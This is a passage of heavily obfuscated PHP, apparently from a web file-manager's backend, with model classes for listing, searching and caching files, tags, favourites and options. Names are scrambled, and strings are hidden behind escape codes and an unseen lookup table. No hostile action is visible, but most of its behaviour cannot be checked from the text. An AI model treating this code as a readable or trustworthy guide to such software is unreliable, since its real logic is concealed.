$’šÇÆøà = $this->field($ğ˜ªÆÕê…õ“–[397])->where($”ê“Ï)->select(); $ç¼ = array_to_keyvalue($’šÇÆøà, $ğ˜ªÆÕê…õ“–[33], $ğ˜ªÆÕê…õ“–[397]); return $ç¼; } private function _listSearchChildrenNear($Ã…, $æ¾ßœ•) { $Û€”±„ƒÁÂ´ó =& $_SERVER[ÀÆ]; $Şï = array(); $‚ß ¸¦İ¶À = array($Û€”±„ƒÁÂ´ó[492] => $Ã…); $ËÀ = $this->field($Û€”±„ƒÁÂ´ó[1993])->where($‚ß ¸¦İ¶À)->select(); $ÀáÛä = array_to_keyvalue(array_filter_by_field($ËÀ, $Û€”±„ƒÁÂ´ó[405], $Û€”±„ƒÁÂ´ó[87]), $Û€”±„ƒÁÂ´ó[33], $Û€”±„ƒÁÂ´ó[397]); $Şï = array_merge($Şï, array_to_keyvalue($ËÀ, $Û€”±„ƒÁÂ´ó[33], $Û€”±„ƒÁÂ´ó[397])); if (!$ÀáÛä) { return $Şï; } $‚ß ¸¦İ¶À = array($Û€”±„ƒÁÂ´ó[492] => array($Û€”±„ƒÁÂ´ó[7], $ÀáÛä)); $ËÀ = $this->field($Û€”±„ƒÁÂ´ó[1993])->where($‚ß ¸¦İ¶À)->limit($æ¾ßœ•)->select(); $Şï = array_merge($Şï, array_to_keyvalue($ËÀ, $Û€”±„ƒÁÂ´ó[33], $Û€”±„ƒÁÂ´ó[397])); $Şï = array_slice($Şï, 0, $æ¾ßœ•); return $Şï; } private function _listSearchBindPinyin($É’íŠ“ê, &$­ı¼, &$íº¢‘œ‘) { $¢î½ßûöè =& $_SERVER[ÀÆ]; if (!isset($É’íŠ“ê[$¢î½ßûöè[1830]]) || !$É’íŠ“ê[$¢î½ßûöè[1830]]) { return; } if (!Input::check($É’íŠ“ê[$¢î½ßûöè[1830]], $¢î½ßûöè[316]) || strlen($É’íŠ“ê[$¢î½ßûöè[1830]]) < 2) { return; } $Â©ÎÂ = "\114\x45\106\x54\x20\x4a\117\x49\116\x20{$this->tablePrefix}\x69\157\x5f\x73\157\165\162\143\145\x5f\x6d\145\x74\141\x20\155\x65\x74\x61\40\x6f\x6e\x20\x73\157\165\162\143\x65\x2e\163\157\165\162\143\x65\x49\104\x20\x3d\x20\155\x65\164\141\56\163\x6f\165\162\143\x65\x49\104"; $È = array(); $íº¢‘œ‘ = str_replace(array($¢î½ßûöè[229], $¢î½ßûöè[50], $¢î½ßûöè[1994]), $¢î½ßûöè[33], $íº¢‘œ‘); $íº¢‘œ‘ = $¢î½ßûöè[430] . str_replace($¢î½ßûöè[47], $¢î½ßûöè[431], $íº¢‘œ‘); $ÀìÛèÛ­ = $­ı¼[$¢î½ßûöè[28]]; unset($­ı¼[$¢î½ßûöè[28]]); foreach ($­ı¼ as $ª²ø => $®Úæ­) { $È[$¢î½ßûöè[430] . $ª²ø] = $®Úæ­; } foreach ($ÀìÛèÛ­ as $ªÄ‹ÏÇ) { $È[] = array($¢î½ßûöè[435] => $ªÄ‹ÏÇ, $¢î½ßûöè[991] => $¢î½ßûöè[1834], array($¢î½ßûöè[1995] => $ªÄ‹ÏÇ, $¢î½ßûöè[1996] => array($¢î½ßûöè[7], array($¢î½ßûöè[458], $¢î½ßûöè[457])))); } $this->join($Â©ÎÂ); $­ı¼ = $È; } private function _parseSearchWhere($…) { $¹šøş· =& $_SERVER[ÀÆ]; $ãäå = array(); if (isset($…[$¹šøş·[746]]) && $…[$¹šøş·[746]]) { $ãäå[$¹šøş·[84]] = array($¹šøş·[1997], $…[$¹šøş·[746]]); } if (isset($…[$¹šøş·[490]]) && $…[$¹šøş·[490]]) { $Â½ü = array($¹šøş·[1998], $…[$¹šøş·[490]]); if ($ãäå[$¹šøş·[84]]) { $ãäå[$¹šøş·[84]] = array($ãäå[$¹šøş·[84]], $Â½ü, $¹šøş·[1999]); } else { $ãäå[$¹šøş·[84]] = $Â½ü; } } if (isset($…[$¹šøş·[1991]]) && $…[$¹šøş·[1991]] > 0) { $ãäå[$¹šøş·[78]] = array($¹šøş·[1997], $…[$¹šøş·[1991]]); } if (isset($…[$¹šøş·[1992]]) && $…[$¹šøş·[1992]]) { $Â½ü = array($¹šøş·[1998], $…[$¹šøş·[1992]]); if ($ãäå[$¹šøş·[78]]) { $ãäå[$¹šøş·[78]] = array($ãäå[$¹šøş·[78]], $Â½ü, $¹šøş·[1999]); } else { $ãäå[$¹šøş·[78]] = $Â½ü; } } if (isset($…[$¹šøş·[588]]) && $…[$¹šøş·[588]]) { $ãäå[] = array($¹šøş·[448] => $…[$¹šøş·[588]], $¹šøş·[446] => $…[$¹šøş·[588]], $¹šøş·[991] => $¹šøş·[1834]); } if (isset($…[$¹šøş·[407]]) && $…[$¹šøş·[407]]) { $›Ç¨ÕÖÖ Ã· = $…[$¹šøş·[407]]; if ($›Ç¨ÕÖÖ Ã· == $¹šøş·[77]) { $ãäå[$¹šøş·[405]] = 1; } else { if ($›Ç¨ÕÖÖ Ã· == $¹šøş·[2000]) { $ãäå[$¹šøş·[405]] = 0; } else { if ($›Ç¨ÕÖÖ Ã·) { $›Ç¨ÕÖÖ Ã· = is_array($›Ç¨ÕÖÖ Ã·) ? $›Ç¨ÕÖÖ Ã· : explode($¹šøş·[47], $›Ç¨ÕÖÖ Ã·); $ãäå[$¹šøş·[407]] = array($¹šøş·[413], $›Ç¨ÕÖÖ Ã·); $ãäå[$¹šøş·[405]] = 0; } } } } $this->_parseSearchParent($…, $ãäå); if (isset($…[$¹šøş·[1830]]) && trim($…[$¹šøş·[1830]])) { $üüÉŒÊÛ« = trim($…[$¹šøş·[1830]]); $ëƒ˜›„ = explode($¹šøş·[50], $üüÉŒÊÛ«); if (strlen($üüÉŒÊÛ«) > 2 && (substr($üüÉŒÊÛ«, 0, 1) == $¹šøş·[116] && substr($üüÉŒÊÛ«, -1) == $¹šøş·[116]) || substr($üüÉŒÊÛ«, 0, 1) == $¹šøş·[55] && substr($üüÉŒÊÛ«, -1) == $¹šøş·[55]) { $üüÉŒÊÛ« = substr($üüÉŒÊÛ«, 1, -1); $ëƒ˜›„ = array($üüÉŒÊÛ«); } $ãäå[$¹šøş·[28]] = array(array($¹šøş·[538], $¹šøş·[1832] . $üüÉŒÊÛ« . $¹šøş·[1832])); if (count($ëƒ˜›„) > 1) { $ãäå[$¹šøş·[28]] = array(); foreach ($ëƒ˜›„ as $¹»î¯ïå) { if (!trim($¹»î¯ïå)) { continue; } $ãäå[$¹šøş·[28]][] = array($¹šøş·[538], $¹šøş·[1832] . trim($¹»î¯ïå) . $¹šøş·[1832]); } } } return $ãäå; } private function _parseSearchParent($é³¥ãñªÕ®ª, &$•„şÉ±è³ÀŞ) { $èØó´©¾”—½ =& $_SERVER[ÀÆ]; if (!isset($é³¥ãñªÕ®ª[$èØó´©¾”—½[492]]) || !$é³¥ãñªÕ®ª[$èØó´©¾”—½[492]]) { return; } $å¤ıÌ“å = $this->pathInfo($é³¥ãñªÕ®ª[$èØó´©¾”—½[492]]); $¥İ = $å¤ıÌ“å[$èØó´©¾”—½[492]] . $èØó´©¾”—½[33] === $èØó´©¾”—½[191]; $’“ª¸ = $å¤ıÌ“å[$èØó´©¾”—½[406]] == $èØó´©¾”—½[509]; $•„şÉ±è³ÀŞ[$èØó´©¾”—½[578]] = array($èØó´©¾”—½[538], $å¤ıÌ“å[$èØó´©¾”—½[515]] . $é³¥ãñªÕ®ª[$èØó´©¾”—½[492]] . $èØó´©¾”—½[539]); $Šî¿Õ´ = isset($é³¥ãñªÕ®ª[$èØó´©¾”—½[1697]]) && in_array($èØó´©¾”—½[509], $é³¥ãñªÕ®ª[$èØó´©¾”—½[1697]]); if (!$Šî¿Õ´ || !$’“ª¸ || !$¥İ || !$å¤ıÌ“å[$èØó´©¾”—½[408]]) { return; } if (!AuthModel::authCheckRoot($å¤ıÌ“å[$èØó´©¾”—½[408]][$èØó´©¾”—½[409]])) { return; } $¤Š = $å¤ıÌ“å[$èØó´©¾”—½[498]] . $èØó´©¾”—½[33]; if ($¤Š == $èØó´©¾”—½[87]) { unset($•„şÉ±è³ÀŞ[$èØó´©¾”—½[578]]); $•„şÉ±è³ÀŞ[$èØó´©¾”—½[406]] = self::TYPE_GROUP; return; } $ş³ = Model($èØó´©¾”—½[516])->groupChildrenAll($¤Š); $ÆõÚìŞ£‚ = count($ş³); if ($ÆõÚìŞ£‚ <= 1) { return; } $Š¹à¿©¬Ëµ = array($èØó´©¾”—½[492] => 0, $èØó´©¾”—½[406] => self::TYPE_GROUP, $èØó´©¾”—½[498] => array($èØó´©¾”—½[7], $ş³)); $£öäŸ·Î´Ç© = $this->field($èØó´©¾”—½[2001])->where($Š¹à¿©¬Ëµ)->limit($ÆõÚìŞ£‚)->select(); $•„şÉ±è³ÀŞ[$èØó´©¾”—½[578]] = array(); foreach ($£öäŸ·Î´Ç© as $Ù®·) { $•„şÉ±è³ÀŞ[$èØó´©¾”—½[578]][] = array($èØó´©¾”—½[538], $èØó´©¾”—½[525] . $Ù®·[$èØó´©¾”—½[397]] . $èØó´©¾”—½[539]); } $•„şÉ±è³ÀŞ[$èØó´©¾”—½[578]][] = $èØó´©¾”—½[1834]; } } goto EÀ¨¢àµ‡È; bóªÊåÒ”š: class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($€ä´·´ = false, $íÓ“å† = '', $Ô = false) { $¸ì»”Î =& $_SERVER[ÀÆ]; $Á¢³¥¦ = $this->cacheGet($íÓ“å†); $øé = $this->optionDefault($íÓ“å†); $øé = is_array($øé) ? $øé : array(); if (is_array($Á¢³¥¦)) { $Á¢³¥¦ = array_merge($øé, $Á¢³¥¦); return $€ä´·´ ? isset($Á¢³¥¦[$€ä´·´]) ? $Á¢³¥¦[$€ä´·´] : null : $Á¢³¥¦; } $Àù¥ûÆ©ê‡ñá = $this->filterWhere(array($¸ì»”Î[29] => $íÓ“å†)); $Á¢³¥¦ = $this->where($Àù¥ûÆ©ê‡ñá)->select(); $Á¢³¥¦ = array_to_keyvalue($Á¢³¥¦, $¸ì»”Î[93], $¸ì»”Î[372]); foreach ($Á¢³¥¦ as $ıˆ¼£ => $õĞ›À¬å) { if ($Ô || in_array($ıˆ¼£, $this->jsonField)) { $Á¢³¥¦[$ıˆ¼£] = json_decode($õĞ›À¬å, !0); } } $this->cacheSet($íÓ“å†, $Á¢³¥¦); $Á¢³¥¦ = array_merge($øé, $Á¢³¥¦); return $€ä´·´ ? $Á¢³¥¦[$€ä´·´] : $Á¢³¥¦; } public function set($†ı, $©˜ø¡Œ±Ö = false, $Ìøßñş = '') { $å¢ =& $_SERVER[ÀÆ]; $this->cacheRemove($Ìøßñş); $ıÈ©ÀØ—‚µÙ = array(); $ÆéŠÂÌ = is_array($†ı) ? $†ı : array($†ı => $©˜ø¡Œ±Ö); foreach ($ÆéŠÂÌ as $Ÿ‘ => $‡‰¼ô¬ñ) { if (is_array($‡‰¼ô¬ñ)) { $‡‰¼ô¬ñ = json_encode_force($‡‰¼ô¬ñ); } $this->checkLength($‡‰¼ô¬ñ, !1, $this->tableName . $å¢[4] . $†ı); $‡‰¼ô¬ñ = self::textEncode($‡‰¼ô¬ñ); $ÆéŠÂÌ = array($å¢[29] => $Ìøßñş, $å¢[93] => $Ÿ‘, $å¢[372] => $‡‰¼ô¬ñ); $ıÈ©ÀØ—‚µÙ[] = $this->filterWhere($ÆéŠÂÌ); } if (!$ıÈ©ÀØ—‚µÙ) { return !0; } return $this->addAll($ıÈ©ÀØ—‚µÙ, array(), !0); } protected function optionDefault($¶ = '') { return !1; } public function setDeep($‹¢üªÀ, $¼’ïºõé = false, $æÌ÷©©ÉöŒ = '') { $ÌìÉ = explode($_SERVER[ÀÆ][95], $‹¢üªÀ); $ş­±„ ñê… = $this->get(); array_set_value($ş­±„ ñê…, $‹¢üªÀ, $¼’ïºõé); $this->set($ÌìÉ[0], $ş­±„ ñê…[$ÌìÉ[0]], $æÌ÷©©ÉöŒ); } public function remove($ë´Ãş‡şÂø, $İã«‚Äƒä¦ = '') { $çÇ =& $_SERVER[ÀÆ]; $this->cacheRemove($İã«‚Äƒä¦); $…—Œ = $this->filterWhere(array($çÇ[93] => $ë´Ãş‡şÂø, $çÇ[29] => $İã«‚Äƒä¦)); if (is_null($ë´Ãş‡şÂø)) { unset($…—Œ[$çÇ[93]]); } return $this->where($…—Œ)->delete(); } public function cacheSet($ıš„€£Ğõ, $±…¬‡“Ÿ²äìÎ = false) { return Cache::set($this->cacheKey($ıš„€£Ğõ), $±…¬‡“Ÿ²äìÎ); } public function cacheGet($áâåæªÕè) { return Cache::get($this->cacheKey($áâåæªÕè)); } public function cacheRemove($İòó–¥±´) { return Cache::remove($this->cacheKey($İòó–¥±´)); } protected function filterWhere($½½ğ³) { return $½½ğ³; } protected function cacheKey($Á®Œ«æ·¨ì¾) { return $Á®Œ«æ·¨ì¾; } } class SourceListModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\163\157\165\162\x63\145"; protected $tableMeta = array("\x74\141\142\154\x65\x4e\x61\x6d\x65" => "\151\x6f\137\x73\157\165\162\143\145\x5f\155\x65\164\141", "\x6d\145\164\x61\x46\x69\x65\154\x64" => "\163\157\x75\x72\143\145\111\x44"); protected $dataAuto = array(array("\155\x6f\x64\x69\x66\x79\124\151\155\145", "\164\x69\155\145", "\x69\x6e\163\145\x72\164", "\x66\x75\156\x63\164\151\157\156"), array("\143\162\x65\x61\x74\x65\124\x69\155\145", "\x74\x69\x6d\x65", "\151\156\163\x65\x72\164", "\146\165\156\143\164\151\x6f\x6e"), array("\166\x69\x65\x77\x54\151\x6d\x65", "\x74\151\155\145", "\x69\156\163\145\162\x74", "\x66\x75\156\143\164\x69\x6f\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($È¸º‰½úå) { return $this->listSource(array($_SERVER[ÀÆ][396] => $È¸º‰½úå)); } public function typeName($—) { static $£ÈÎÎ«¨´ö = array(self::TYPE_SYSTEM => "\x73\x79\163\164\145\x6d", self::TYPE_USER => "\x75\x73\145\x72", self::TYPE_GROUP => "\147\162\x6f\165\x70"); return $£ÈÎÎ«¨´ö[$— . $_SERVER[ÀÆ][33]]; } public function sourceListInfo($±™§Á, $ßı‡–øè = false) { $ğ…«Æ´Ş =& $_SERVER[ÀÆ]; $±™§Á = $±™§Á ? $±™§Á : array(); $±™§Á = array_filter(array_unique($±™§Á)); if (!$±™§Á) { return array(); } $•¬ı = $this->where(array($ğ…«Æ´Ş[397] => array($ğ…«Æ´Ş[7], $±™§Á)))->select(); $this->_listDataApply($•¬ı, $ßı‡–øè); return array_to_keyvalue($•¬ı, $ğ…«Æ´Ş[397]); } public function pathInfoFilter(&$Ï”¹ê¤²£èÕ¡) { $ç· =& $_SERVER[ÀÆ]; static $Öğ = false; static $¾ïŞåÂ¨ = false; static $Ì—†âµŒ = false; if (!$Öğ) { $å×íÃ±ä±  = $ç·[398]; $å×íÃ±ä±  .= $ç·[399]; $å×íÃ±ä±  .= $ç·[400]; $õÍØ²¥øçÅç = $ç·[401]; $ñ¥Úàü¿Ö½ºƒ = explode($ç·[47], $õÍØ²¥øçÅç); $Öğ = explode($ç·[47], $å×íÃ±ä± ); $¾ïŞåÂ¨ = array(); foreach ($Öğ as $ôÙ£ù¦¾û½‚Ô) { if (in_array($ôÙ£ù¦¾û½‚Ô, $ñ¥Úàü¿Ö½ºƒ)) { continue; } $¾ïŞåÂ¨[] = $ôÙ£ù¦¾û½‚Ô; } $Ì—†âµŒ = explode($ç·[47], $ç·[402]); } foreach ($Ì—†âµŒ as $›Àã¥şî÷‡) { if (isset($Ï”¹ê¤²£èÕ¡[$›Àã¥şî÷‡])) { $Ï”¹ê¤²£èÕ¡[$›Àã¥şî÷‡] = intval($Ï”¹ê¤²£èÕ¡[$›Àã¥şî÷‡]); } } $Ï”¹ê¤²£èÕ¡[$ç·[76]] = $ç·[403] . $Ï”¹ê¤²£èÕ¡[$ç·[397]] . $ç·[404]; $Ï”¹ê¤²£èÕ¡[$ç·[29]] = $Ï”¹ê¤²£èÕ¡[$ç·[405]] == 1 ? $ç·[77] : $ç·[193]; $Ï”¹ê¤²£èÕ¡[$ç·[406]] = $this->typeName($Ï”¹ê¤²£èÕ¡[$ç·[406]]); if ($Ï”¹ê¤²£èÕ¡[$ç·[405]] != 1) { $Ï”¹ê¤²£èÕ¡[$ç·[168]] = $Ï”¹ê¤²£èÕ¡[$ç·[407]]; unset($Ï”¹ê¤²£èÕ¡[$ç·[407]]); } $·Û = $Öğ; if (isset($Ï”¹ê¤²£èÕ¡[$ç·[408]]) && $Ï”¹ê¤²£èÕ¡[$ç·[408]][$ç·[409]] == -1) { $·Û = $¾ïŞåÂ¨; } $Ï”¹ê¤²£èÕ¡ = array_field_key($Ï”¹ê¤²£èÕ¡, $·Û); return $Ï”¹ê¤²£èÕ¡; } public function listUserFav() { $…ö¦ç¹‚ˆã =& $_SERVER[ÀÆ]; $· ‡ñë = Model($…ö¦ç¹‚ˆã[410])->listData(); $•óëŞºŠ = array_filter_by_field($· ‡ñë, $…ö¦ç¹‚ˆã[29], $…ö¦ç¹‚ˆã[411]); $•óëŞºŠ = array_to_keyvalue($•óëŞºŠ, $…ö¦ç¹‚ˆã[33], $…ö¦ç¹‚ˆã[76]); if ($•óëŞºŠ) { $ıÇÈ¿«÷æ™²¹ = $this->listSource(array($…ö¦ç¹‚ˆã[412] => array($…ö¦ç¹‚ˆã[413], $•óëŞºŠ))); } $ıÇÈ¿«÷æ™²¹ = array_to_keyvalue($ıÇÈ¿«÷æ™²¹[$…ö¦ç¹‚ˆã[367]], $…ö¦ç¹‚ˆã[397]); foreach ($· ‡ñë as &$áÔ†) { $áÔ† = array($…ö¦ç¹‚ˆã[414] => $áÔ†[$…ö¦ç¹‚ˆã[395]], $…ö¦ç¹‚ˆã[415] => $áÔ†[$…ö¦ç¹‚ˆã[28]], $…ö¦ç¹‚ˆã[416] => $áÔ†[$…ö¦ç¹‚ˆã[76]], $…ö¦ç¹‚ˆã[417] => $áÔ†[$…ö¦ç¹‚ˆã[29]], $…ö¦ç¹‚ˆã[418] => $áÔ†[$…ö¦ç¹‚ˆã[194]], $…ö¦ç¹‚ˆã[419] => $áÔ†[$…ö¦ç¹‚ˆã[84]]); if ($áÔ†[$…ö¦ç¹‚ˆã[29]] == $…ö¦ç¹‚ˆã[411] && $ıÇÈ¿«÷æ™²¹[$áÔ†[$…ö¦ç¹‚ˆã[76]]]) { $áÔ†[$…ö¦ç¹‚ˆã[85]] = $ıÇÈ¿«÷æ™²¹[$áÔ†[$…ö¦ç¹‚ˆã[76]]]; } } unset($áÔ†); return $· ‡ñë; } public function listUserTag($äÄ¦üö°) { $ªã£ÙÜ†© =& $_SERVER[ÀÆ]; if ($äÄ¦üö° && !is_array($äÄ¦üö°)) { $äÄ¦üö° = array($äÄ¦üö°); } $ŞŒ½êèÆ¨£ = Model($ªã£ÙÜ†©[420])->listData(); $€œ‰´™¥«Ğ = array(); foreach ($ŞŒ½êèÆ¨£ as $â‹) { $€ëò†ŠÎ¥Úş = $â‹[$ªã£ÙÜ†©[76]]; if (!$€ëò†ŠÎ¥Úş) { continue; } if (!isset($€œ‰´™¥«Ğ[$€ëò†ŠÎ¥Úş])) { $€œ‰´™¥«Ğ[$€ëò†ŠÎ¥Úş] = array(); } $€œ‰´™¥«Ğ[$€ëò†ŠÎ¥Úş][] = $â‹[$ªã£ÙÜ†©[421]]; } $İù©ô‰–ü = array(); foreach ($€œ‰´™¥«Ğ as $¤¶† => $ÄÛÄ) { $¾ = !0; if (!$äÄ¦üö°) { $İù©ô‰–ü[] = $¤¶†; continue; } foreach ($äÄ¦üö° as $èà§ã•Ø) { if (!in_array($èà§ã•Ø, $ÄÛÄ)) { $¾ = !1; break; } } if ($¾) { $İù©ô‰–ü[] = $¤¶†; } } if (!$İù©ô‰–ü) { return array(); } $ôÊà = $this->listSource(array($ªã£ÙÜ†©[412] => array($ªã£ÙÜ†©[413], $İù©ô‰–ü))); if (!$ôÊà || count($İù©ô‰–ü) == $ôÊà[$ªã£ÙÜ†©[364]][$ªã£ÙÜ†©[365]]) { return $ôÊà; } $©Ãä“Ÿ = array(); $ëş§ = array_to_keyvalue($ôÊà[$ªã£ÙÜ†©[75]], $ªã£ÙÜ†©[33], $ªã£ÙÜ†©[397]); $Š = array_to_keyvalue($ôÊà[$ªã£ÙÜ†©[74]], $ªã£ÙÜ†©[33], $ªã£ÙÜ†©[397]); $½ç«¤ü­Ÿ À = array_merge($Š, $ëş§); foreach ($İù©ô‰–ü as $€ëò†ŠÎ¥Úş) { if (!in_array($€ëò†ŠÎ¥Úş, $½ç«¤ü­Ÿ À)) { $©Ãä“Ÿ[] = $€ëò†ŠÎ¥Úş; } } if ($©Ãä“Ÿ) { Model($ªã£ÙÜ†©[422])->removeBySource($©Ãä“Ÿ); } return $ôÊà; } public function listUserRecycle() { $ÆÑÌ„ =& $_SERVER[ÀÆ]; $—¨ = Model($ÆÑÌ„[423])->listData(); if (!$—¨) { return array(); } $—íàë¿‚ = array($ÆÑÌ„[412] => array($ÆÑÌ„[413], $—¨), $ÆÑÌ„[424] => 1); return $this->listSource($—íàë¿‚); } public function listSource($¯³, $»©Ÿ = 3000) { $Ó“ë ºµöŒ =& $_SERVER[ÀÆ]; if (!isset($¯³[$Ó“ë ºµöŒ[425]])) { $¯³[$Ó“ë ºµöŒ[425]] = 0; } $ñ°­ğ¿ÀÄ = $Ó“ë ºµöŒ[426]; $ãğ´á¶£ì = $this->field($ñ°­ğ¿ÀÄ)->_makeOrder()->where($¯³)->selectPage($»©Ÿ); $this->_listPageCheck($ãğ´á¶£ì, $ñ°­ğ¿ÀÄ, $¯³); $this->_listDataApply($ãğ´á¶£ì[$Ó“ë ºµöŒ[367]]); $this->_listMake($ãğ´á¶£ì); return $ãğ´á¶£ì; } private function _listPageCheck(&$ À, $†úäšÁ…, $‘“¦) { $ë±Ô§Â˜§• =& $_SERVER[ÀÆ]; if (!is_array($ À[$ë±Ô§Â˜§•[364]])) { return; } $¸·ò = $ À[$ë±Ô§Â˜§•[364]]; if ($¸·ò[$ë±Ô§Â˜§•[366]] <= 1) { return; } if ($¸·ò[$ë±Ô§Â˜§•[365]] >= 100000) { return; } if (Model($ë±Ô§Â˜§•[427])->get($ë±Ô§Â˜§•[428]) != $ë±Ô§Â˜§•[429]) { return; } $†úäšÁ… = str_replace(array($ë±Ô§Â˜§•[50], $ë±Ô§Â˜§•[340], $ë±Ô§Â˜§•[229]), $ë±Ô§Â˜§•[33], $†úäšÁ…); $†úäšÁ… = $ë±Ô§Â˜§•[430] . str_replace($ë±Ô§Â˜§•[47], $ë±Ô§Â˜§•[431], $†úäšÁ…) . $ë±Ô§Â˜§•[432]; $¶Û­âÍ = $ë±Ô§Â˜§•[433]; $¶Û­âÍ = $¶Û­âÍ . $ë±Ô§Â˜§•[434]; $Û»Çôì”œ¹ = $¸·ò[$ë±Ô§Â˜§•[361]] * ($¸·ò[$ë±Ô§Â˜§•[351]] - 1) . $ë±Ô§Â˜§•[47] . $¸·ò[$ë±Ô§Â˜§•[361]]; $Â¡¬â = $this->_makeOrder(!0); $Æğ€ = $ë±Ô§Â˜§•[430] . str_replace($ë±Ô§Â˜§•[47], $ë±Ô§Â˜§•[431], $Â¡¬â[0]); if (strpos($Æğ€, $ë±Ô§Â˜§•[435])) { $Æğ€ = str_replace($ë±Ô§Â˜§•[435], $ë±Ô§Â˜§•[436], $Æğ€); } else { $Æğ€ .= $ë±Ô§Â˜§•[437] . $Â¡¬â[1]; } $Üâ’‰ı = array(); foreach ($‘“¦ as $û· => $àíÌë¢ê“É©) { $Üâ’‰ı[$ë±Ô§Â˜§•[430] . $û·] = $àíÌë¢ê“É©; } $this->alias($ë±Ô§Â˜§•[438])->field($†úäšÁ…)->limit($Û»Çôì”œ¹)->order($Æğ€); $¶ÚÛáë = $this->join($¶Û­âÍ)->where($Üâ’‰ı)->select(); if ($¶ÚÛáë) { $ À[$ë±Ô§Â˜§•[367]] = $¶ÚÛáë; } } protected function _makeOrder($Êé„È¢çƒ = false) { $Â =& $_SERVER[ÀÆ]; $Ë¨±¹ = Model($Â[439])->get($Â[440]); $ìÂ…ù¾ = Model($Â[439])->get($Â[441]); $ñó = array($Â[442] => $Â[443], $Â[444] => $Â[445]); $÷Ø†ı = array($Â[28] => $Â[28], $Â[78] => $Â[78], $Â[168] => $Â[407], $Â[446] => $Â[446], $Â[447] => $Â[448], $Â[194] => $Â[194], $Â[84] => $Â[84]); $Èœ¨ÕÅªô®Á = Input::get($Â[449], $Â[7], $Ë¨±¹, array_keys($÷Ø†ı)); $äØõëÀ¤ï¼ = Input::get($Â[450], $Â[7], $ìÂ…ù¾, array_keys($ñó)); if (!in_array($Èœ¨ÕÅªô®Á, array_keys($÷Ø†ı))) { $Èœ¨ÕÅªô®Á = $Â[28]; } if (!in_array($äØõëÀ¤ï¼, array_keys($ñó))) { $Èœ¨ÕÅªô®Á = $Â[442]; } if ($Èœ¨ÕÅªô®Á == $Â[28]) { } $î «¢ì = $Â[451] . $÷Ø†ı[$Èœ¨ÕÅªô®Á] . $Â[50] . $ñó[$äØõëÀ¤ï¼]; $î «¢ì = rtrim(trim($î «¢ì), $Â[47]); if ($Êé„È¢çƒ) { return array($î «¢ì, $ñó[$äØõëÀ¤ï¼]); } return $this->order($î «¢ì); } protected function _listDataApplyItem($üÙÁ•Ñ®øó, $“£Œ ÜÈ® = false) { $êË = array($üÙÁ•Ñ®øó); $this->_listDataApply($êË, $“£Œ ÜÈ®); return $êË[0]; } protected function _listDataApply(&$íÍıÔ•é…, $îê†‹’ğ = false) { $µ¿ŠÙÛ¯ÈÉ =& $_SERVER[ÀÆ]; if (!$íÍıÔ•é…) { $íÍıÔ•é… = array(); return; } $–úÒÉßÜ¾ò = array_to_keyvalue($íÍıÔ•é…, $µ¿ŠÙÛ¯ÈÉ[33], $µ¿ŠÙÛ¯ÈÉ[397]); $–úÒÉßÜ¾ò = array_unique($–úÒÉßÜ¾ò); $this->_listSourceCache($íÍıÔ•é…); if (!$îê†‹’ğ) { $this->_listAppendMeta($íÍıÔ•é…, $–úÒÉßÜ¾ò); $this->_listAppendFileMeta($íÍıÔ•é…, $–úÒÉßÜ¾ò); $this->_listAppendChildren($íÍıÔ•é…, $–úÒÉßÜ¾ò); } $this->_listAppendPath($íÍıÔ•é…); $this->_listAppendAuth($íÍıÔ•é…); $this->_listAppendSourceInfo($íÍıÔ•é…, $–úÒÉßÜ¾ò); $this->_listAppendUser($íÍıÔ•é…); $this->_listFilterInfo($íÍıÔ•é…, $îê†‹’ğ); $this->_listAppendAuthSecret($íÍıÔ•é…); } protected function _listSourceCache($´ÅÙ·É) { $‚ïéé =& $_SERVER[ÀÆ]; foreach ($´ÅÙ·É as $€¹¨ëøßã) { self::$cacheSourceInfo[$‚ïéé[452] . $€¹¨ëøßã[$‚ïéé[397]]] = $€¹¨ëøßã; } } protected function _listFilterInfo(&$Áï¬€ì›Şêà´, $¾ = false) { $åã½ß¹‰ =& $_SERVER[ÀÆ]; foreach ($Áï¬€ì›Şêà´ as &$•ËçÁÅ) { $•ËçÁÅ = $this->pathInfoFilter($•ËçÁÅ); self::$cachePathInfo[$åã½ß¹‰[453] . intval($¾) . $åã½ß¹‰[454] . $•ËçÁÅ[$åã½ß¹‰[397]]] = $•ËçÁÅ; } unset($•ËçÁÅ); } protected function _listMake(&$óŸÕÉÊò) { $ç“ºµó™ =& $_SERVER[ÀÆ]; $óŸÕÉÊò[$ç“ºµó™[75]] = array(); $óŸÕÉÊò[$ç“ºµó™[74]] = array(); foreach ($óŸÕÉÊò[$ç“ºµó™[367]] as $Î€Æ‰¯) { $Ó = $Î€Æ‰¯[$ç“ºµó™[405]] == 1 ? $ç“ºµó™[75] : $ç“ºµó™[74]; $óŸÕÉÊò[$Ó][] = $Î€Æ‰¯; } unset($óŸÕÉÊò[$ç“ºµó™[367]]); } protected function _listAppendMeta(&$©ö¹ÒŠ™é«¸Ä, $£úÙš»Â) { $¾Ãš =& $_SERVER[ÀÆ]; $ãşõ†•Œ‹Ô = array($¾Ãš[412] => array($¾Ãš[413], $£úÙš»Â)); $â­ëÛñ…“ü† = Model($¾Ãš[455])->field($¾Ãš[456])->where($ãşõ†•Œ‹Ô)->select(); if (!$â­ëÛñ…“ü†) { return; } $ÓË§“æ = array($¾Ãš[457], $¾Ãš[458], $¾Ãš[436]); $÷¼¥ºãº = array(); foreach ($â­ëÛñ…“ü† as $ïñ) { if (!isset($÷¼¥ºãº[$ïñ[$¾Ãš[397]]])) { $÷¼¥ºãº[$ïñ[$¾Ãš[397]]] = array(); } if (in_array($ïñ[$¾Ãš[93]], $ÓË§“æ)) { continue; } $÷¼¥ºãº[$ïñ[$¾Ãš[397]]][$ïñ[$¾Ãš[93]]] = $ïñ[$¾Ãš[372]]; } foreach ($©ö¹ÒŠ™é«¸Ä as &$İî‚Äí) { $İî‚Äí[$¾Ãš[459]] = !1; if (isset($÷¼¥ºãº[$İî‚Äí[$¾Ãš[397]]])) { $İî‚Äí[$¾Ãš[459]] = $÷¼¥ºãº[$İî‚Äí[$¾Ãš[397]]]; } if ($this->fileIsLock($İî‚Äí) && $İî‚Äí[$¾Ãš[408]]) { $â¦±‘¯ˆ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $İî‚Äí[$¾Ãš[408]][$¾Ãš[409]] = AuthModel::authDisable($İî‚Äí[$¾Ãš[408]][$¾Ãš[409]], 